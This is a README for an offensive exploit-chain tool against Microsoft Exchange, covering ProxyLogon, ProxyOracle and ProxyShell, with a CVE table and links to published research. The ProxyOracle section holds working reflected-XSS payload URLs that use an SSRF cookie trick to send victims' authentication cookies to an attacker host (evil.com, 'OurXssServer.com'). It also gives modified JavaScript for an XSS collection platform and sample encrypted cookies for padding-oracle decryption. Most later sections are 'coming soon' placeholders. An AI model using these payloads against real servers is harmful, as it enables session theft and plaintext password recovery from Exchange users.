# Proxy-Attackchain

proxylogon, proxyshell, proxyoracle full chain exploit tool

1. ProxyLogon: The most well-known and impactful Exchange exploit chain
2. ProxyOracle: The attack which could recover any password in plaintext format of Exchange users
3. ProxyShell: The exploit chain demonstrated at [Pwn2Own 2021](https://twitter.com/thezdi/status/1379467992862449664) to take over Exchange and earn $200,000 bounty

ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! [Slides](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf) [Video](https://www.youtube.com/watch?v=5mqid-7zp8k)

## most of the exploit is recoded with golang to speed up...:)

 - ![](./pics/logo-black.png)

| NAME | CVE | patch time | description |
| ----------- | ----------- | ----------- | ----------- |
| ProxyLogon | [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) | Mar 02, 2021 | server-side request forgery (SSRF) |
| ProxyLogon | [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) | Mar 02, 2021 | Microsoft.Exchange.Management.DDIService.WriteFileActivity未校验写文件后缀，可由文件内容部分可控的相关功能写入WebShell |
| ProxyOracle | [CVE-2021-31196](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196) | Jul 13, 2021 | Reflected Cross-Site Scripting |
| ProxyOracle | [CVE-2021-31195](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195) | May 11, 2021 | Padding Oracle Attack on Exchange Cookies Parsing |
| ProxyShell | [CVE-2021-34473](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473) | Apr 13, 2021 | Pre-auth Path Confusion leads to ACL Bypass |
| ProxyShell | [CVE-2021-34523](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523) | Apr 13, 2021 | Elevation of Privilege on Exchange PowerShell Backend |
| ProxyShell | [CVE-2021-31207](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207) | May 11, 2021 | Post-auth Arbitrary-File-Write leads to RCE |
| proxytoken | [CVE-2021-33766](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33766) | July 13, 2021 | With this vulnerability, an unauthenticated attacker can perform configuration actions on mailboxes belonging to arbitrary users. As an illustration of the impact, this can be used to copy all emails addressed to a target and account and forward them to an account controlled by the attacker. |
| Microsoft Exchange Server 远程执行代码漏洞 | [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321) | Nov 17, 2021 | Exchange Deserialization RCE |

# proxylogon

 - ![](pics/proxylogon.png)
 - ![](pics/proxylogon1.png)

# proxyoracle

Once a victim clicks this link, evil.com will receive the cookies.

``` bash
https://ews.lab/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.cookie=`X-AnonResource-Backend=@evil.com:443/path/any.php%23~1941962753`;document.cookie=`X-AnonResource=true`;fetch(`/owa/auth/any.skin`,{credentials:`include`});//
```

or use 3gstudent's way:

## XSS平台搭建

借助SSRF漏洞，控制Exchange服务器将Cookie信息发送至XSS平台，导致最终想要的Cookie信息位于Request Headers中

而现有的XSS平台大都是通过POST请求的参数来传递数据

为了解决这个问题，这里可以选择开源的XSS平台，地址如下：

https://github.com/3gstudent/pyXSSPlatform

只需要修改以下位置：

 - 修改index.js，使用ajax模拟用户发包触发SSRF漏洞

 - 修改 pyXSSPlatform.py ，将GET请求的Request Headers进行提取

 - 使用合法的证书

index.js代码示例：

``` bash
var xmlHttp = new XMLHttpRequest();
xmlhttp.open("GET", "https://192.168.1.1/owa/auth/x.js", false);
document.cookie = "X-AnonResource=true";
document.cookie = "X-AnonResource-Backend=OurXssServer.com/#~1";
xmlhttp.send();
```

## XSS利用代码

控制用户访问XSS平台的代码示例：

``` bash
https://192.168.1.1/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.head.appendChild(document.createElement(/script/.source)).src=/https:\/\/OurXssServer.com\/index.js/.source//
```

example cookie for decryption test:

``` bash
cadata=FVtSAAWdOn29HYDQry+kG+994VUdAxONrayi4nbJW9JWTh8yLueD6IxYpahfxcGsA/B3FoVUQOD2EG605SR4QdeQ1pof+KD//6jwpmYQjv/II+OcqChrFZFvcMWv46a5; cadataTTL=eTxCEHKHDMmd/gEqDuOafg==; cadataKey=T4juhN4dUMKY4wkajUD43n4EWfMwefPQlqzxXmK4GnSHIZqo+g+uQg1Y2ogGoD1HyoVpRYgjGcCu6rmNQK+LsaZ8/lfBCThBI5yAhP1W2Fx+YNKvzy8Bcpui7zTlhAY598lE5Aijs6crHVXJeZkbLfMJgp0cFHj5uTQPcg31O/AeOAnD5c27IYOQ7JqMW7GOUVor1lhYnhh0R/NtWWqyfr5oE9j0jbxIGgrQrXIpLxL/uAU1ddC+/5jG9Edpq4sC213amuU/94rkHYzNH9OsiHYIkXr/NmkB7p908XrFrwXAcvV9QieoRiS3jvKCbzk3mnMu3YTnsJwAuiHzSXdCOQ==; cadataIV=GB9B+rwrigyPOf8xnV1KAek++yovEot9jFcV68WepCTQoRtQ5HUxSC7tE1mmHg0YtE6EOZNUM/WiNGP6xI4UTAofcMOfTLeRpBzeaKOETfjxKK2W7IKn+9k2tRkc1pIlO8FTOVx/dOHOoIFHUkqxFr+TgBULJ1I7tUmO7W0XDX4ZJHfmQhVqOOzeyjImKdX7Uv/jIJrF4VEew7rgvrC8BhqOqWgaTxpGhDTzIXl+wW3crsgZmXpXhOPURej1iwmtvhuQU6iuq4/IRv0lVIW3WvP6gUI8owIUxppnJl7YmN27Aqkjs0nTZZz1LBuZN+YxY4x6Lvs2FMG68jllhE4kwg==; cadataSig=BOJSYN2B+3RsXjO2akh3mqlKKkeAZVamOzfpVo0QdPEA3BHjpR6ls5yD9TzAQzRuWJJaaRIm7wMEiBMFz/sK5jk3R6kWw1OmMtJN2c38PdvwGIe6/7ByJdl52a5ojhDrRZhc4Qc3y+FFRx6XKvqUljTRWtHJGI1Jad2+LiNhJGkalhUeTM/a2V4LiQWf6Vv1KzJO79rZuOOOBnatht/E29j6636FpllCfEKrrogPQ7ADdVS6OOmqNU9gRMVgKnomC2t2PCtuYj26HUjnZ3rfc6BdzVmtu9EYSzccObsB2jxXXclAm5a+NZU/6sj9tlq3gcurjBl9yUDTgbZLg383gw==
```

 - amd64 poc binary usage:
 - just a modyfied version of [padre](https://github.com/glebarez/padre), added proxyoracle detect poc code...
 - ![](pics/proxyoracle.png)

 - python script exp usage:

Decrypt this cookie to plaintext:

 - ![](pics/proxyoracle1.png)

# proxyshell

coming soon...

 - ![](pics/proxyshell.png)

# proxytoken

coming soon...

 - ![](pics/proxytoken.png)

# Exchange RCE CVE-2021-42321

coming soon...

 - ![](pics/CVE-2021-42321.png)

# ***more exp coming soon......***

# Reference (worship to orange!)
 - [Proxylogon](https://proxylogon.com/)
 - [A New Attack Surface on MS Exchange Part 1 - ProxyLogon!](https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html)
 - [ProxyLogon漏洞分析](https://hosch3n.github.io/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321)
 - [Some notes about Microsoft Exchange Deserialization RCE (CVE-2021–42321)](https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852)
 - [A New Attack Surface on MS Exchange Part 2 - ProxyOracle!](https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html)
 - [ProxyOracle漏洞分析](https://hosch3n.github.io/2021/08/23/ProxyOracle%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [My Steps of Reproducing ProxyShell](https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/)
 - [ProxyShell漏洞分析](https://hosch3n.github.io/2021/08/24/ProxyShell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [FROM PWN2OWN 2021: A NEW ATTACK SURFACE ON MICROSOFT EXCHANGE - PROXYSHELL!](https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell)
 - [ProxyVulns](https://github.com/hosch3n/ProxyVulns)
 - [pax](https://github.com/liamg/pax)
 - [padre](https://github.com/glebarez/padre)
 - [python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)